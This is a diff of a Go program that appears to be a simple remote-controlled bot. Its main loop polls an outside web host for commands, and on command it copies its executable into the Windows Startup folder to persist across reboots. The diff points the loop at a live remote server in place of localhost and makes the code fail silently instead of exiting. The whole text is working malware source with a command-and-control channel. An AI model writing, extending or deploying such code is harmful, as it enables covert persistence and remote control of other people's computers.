@@ -4,16 +4,17 @@ import (
 	"fmt"
 	"os"
 	"net/http"
-	"log"
 	"io/ioutil"
 	"path/filepath"
-	"runtime"
+	"time"
+	"strings"
 )
 
-func ErrCheck(err error) {
+func ErrCheck(err error) bool {
 	if err != nil {
-		log.Fatal(err)
+		return true
 	}
+	return false
 }
 
 func copy_to() string {
@@ -22,13 +23,16 @@ func copy_to() string {
 		return "Failed to find the correct path."
 	}
 	startup := filepath.Join(winDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	_, file, _, _ := runtime.Caller(0)
-	src := filepath.Base(file)
+	src := "main.exe"
 	dest := startup+"\\"+src
 	bytesRead, err := ioutil.ReadFile(src)
-	ErrCheck(err)
+	if ErrCheck(err) {
+		return "Sth went wrong!"
+	}
 	err = ioutil.WriteFile(dest, bytesRead, 0644)
-	ErrCheck(err)
+	if ErrCheck(err) {
+		return "Sth went wrong!"
+	}
 	fmt.Println("Looks perfect I think?")
 	return "Everything looks okay =)"
 }
@@ -45,25 +49,31 @@ func start() {
 		}
 		count += 1
 		i*=2
+		fmt.Println(i)
 	}
 }
 
 func main() {
 	for {
-		res, err := http.Get("http://127.0.0.1:8080/")
+		res, err := http.Get("http://dasturchibro.pythonanywhere.com/playwithgo")
 		ErrCheck(err)
 		defer res.Body.Close()
 
 		body, err := ioutil.ReadAll(res.Body)
-		ErrCheck(err)
-		sbody := string(body)
+		if ErrCheck(err) {
+			return
+		}
+    	sbody := strings.Join(strings.Fields(string(body)),"")
 		if sbody == "copy" {
-			http.Get("http://127.0.0.1:8080/?resp="+copy_to())
+			// http.Get("http://127.0.0.1:8080/?resp="+copy_to())
+			fmt.Println(copy_to())
 		} else if sbody == "exit" {
 			fmt.Println("Exit command performed!")
 			break
 		} else if sbody == "start" {
+			copy_to()
 			start()
 		}
 	}
 }
+// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup>
